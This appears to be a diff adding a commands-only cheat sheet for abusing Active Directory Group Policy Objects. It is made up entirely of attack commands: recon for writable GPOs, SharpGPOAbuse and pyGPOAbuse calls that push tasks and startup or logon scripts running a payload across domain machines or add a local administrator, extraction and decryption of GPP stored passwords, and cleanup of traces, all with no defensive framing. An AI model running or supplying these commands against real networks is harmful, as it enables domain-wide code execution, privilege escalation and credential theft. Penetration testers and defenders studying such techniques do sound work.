@@ -1,0 +1,36 @@
+# GPO Abuse — Quick Reference (commands only)
+
+## Recon: Find Writable GPOs
+Get-DomainGPO | Select DisplayName, Name, gpcfilesyspath
+Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=<domain>,DC=local" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|GenericAll|GenericWrite" }
+Get-DomainOU -GPLink "<GPO-GUID>" | Select DistinguishedName
+gpresult /r
+
+## SharpGPOAbuse — Scheduled Task
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c C:\Windows\Temp\payload.exe" --GPOName "<GPO-Name>"
+
+## SharpGPOAbuse — Add Local Admin
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "<GPO-Name>"
+
+## SharpGPOAbuse — Startup Script
+SharpGPOAbuse.exe --AddComputerScript --ScriptName "update.bat" --ScriptContents "C:\Windows\Temp\payload.exe" --GPOName "<GPO-Name>"
+
+## SharpGPOAbuse — User Logon Script
+SharpGPOAbuse.exe --AddUserScript --ScriptName "update.bat" --ScriptContents "C:\Windows\Temp\payload.exe" --GPOName "<GPO-Name>"
+
+## pyGPOAbuse (Linux)
+python3 pygpoabuse.py <domain>/<user>:<pass>@<dc-ip> -gpo-id "<GPO-GUID>" -command "cmd.exe /c C:\Windows\Temp\payload.exe" -taskname "Update" -f
+
+## Force GPO Refresh
+gpupdate /force
+Invoke-GPUpdate -Computer <target> -Force
+
+## GPP Passwords
+nxc smb <dc-ip> -u <user> -p <pass> -M gpp_password
+nxc smb <dc-ip> -u <user> -p <pass> -M gpp_autologin
+findstr /S /I "cpassword" \\<domain>\SYSVOL\<domain>\Policies\*.xml
+gpp-decrypt <cpassword-value>
+
+## Cleanup
+SharpGPOAbuse.exe --RemoveComputerTask --TaskName "Update" --GPOName "<GPO-Name>"
+SharpGPOAbuse.exe --RemoveLocalAdmin --UserAccount <user> --GPOName "<GPO-Name>"
